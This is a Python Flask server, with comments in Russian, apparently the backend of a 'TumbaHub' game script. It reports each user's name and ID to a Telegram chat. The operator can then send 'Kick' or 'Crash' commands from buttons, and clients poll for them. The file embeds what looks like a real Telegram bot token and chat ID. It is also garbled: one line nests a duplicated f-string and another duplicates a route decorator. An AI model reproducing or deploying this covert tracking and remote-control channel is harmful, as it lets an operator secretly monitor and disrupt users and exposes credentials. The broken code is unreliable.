from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# Твои данные
TELEGRAM_TOKEN = '8693862606:AAEvhj2EJeSxHhaw0JopIb_oK-COEZKix1g'
TELEGRAM_CHAT_ID = '8426928414'

# Очередь команд
commands_queue = {}

@app.route('/')
def home():
    return "TumbaHub Server is running!"

@app.route('/api/log_user', methods=['POST'])
def log_user():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data"}), 400

    username = data.get('username', 'Unknown')
    user_id = data.get('userId', 'Unknown')
    
    if username not in commands_queue:
        commands_queue[username] = []

    msg = f"msg = f"🟢 [V2] НОВЫЙ ЗАПУСК!\n👤 Ник: {username}\n🆔 ID: {user_id}""
    
    # === СОЗДАЕМ КНОПКИ ДЛЯ УПРАВЛЕНИЯ ===
    # В callback_data зашиваем действие и ник, например "kick_Player1"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "🥾 Kick", "callback_data": f"kick_{username}"},
                {"text": "💥 Crash", "callback_data": f"crash_{username}"}
            ]
        ]
    }

    # Отправляем сообщение вместе с кнопками (параметр reply_markup)
    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                  json={
                      "chat_id": TELEGRAM_CHAT_ID, 
                      "text": msg,
                      "reply_markup": keyboard
                  })

    return jsonify({"status": "success"})

@app.route('/api/get_command', methods=['GET'])
def get_command():
    username = request.args.get('username')
    
    if username in commands_queue and len(commands_queue[username]) > 0:
        cmd = commands_queue[username].pop(0)
        return jsonify({"status": "success", "command": cmd})
    
    return jsonify({"status": "empty"})

@app.route('/api/telegram_webhook', methods=['POST'])
def @app.route('/api/telegram_webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    
    # ЕСЛИ НАЖАЛИ КНОПКУ (Callback Query)
    if update and "callback_query" in update:
        callback = update["callback_query"]
        chat_id = str(callback["message"]["chat"]["id"])
        data = callback["data"] # Сюда прилетит "kick_ТвойНик" или "crash_ТвойНик"
        callback_id = callback["id"]
        
        if chat_id == TELEGRAM_CHAT_ID:
            # Разделяем "kick_ТвойНик" на действие ("kick") и ник ("ТвойНик")
            parts = data.split('_', 1)
            if len(parts) == 2:
                action = f"/{parts[0]}" # Делаем формат команды: "/kick"
                target_user = parts[1]
                
                # Добавляем команду в очередь для этого игрока
                if target_user not in commands_queue:
                    commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                
                # Отправляем тебе в чат подтверждение, что команда принята
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                    json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ Команда {action} отправлена в очередь для {target_user}"}
                )
                
            # ВАЖНО: Говорим Телеграму, что мы обработали клик, чтобы на кнопке пропали "часики" загрузки
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
                json={"callback_query_id": callback_id}
            )

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
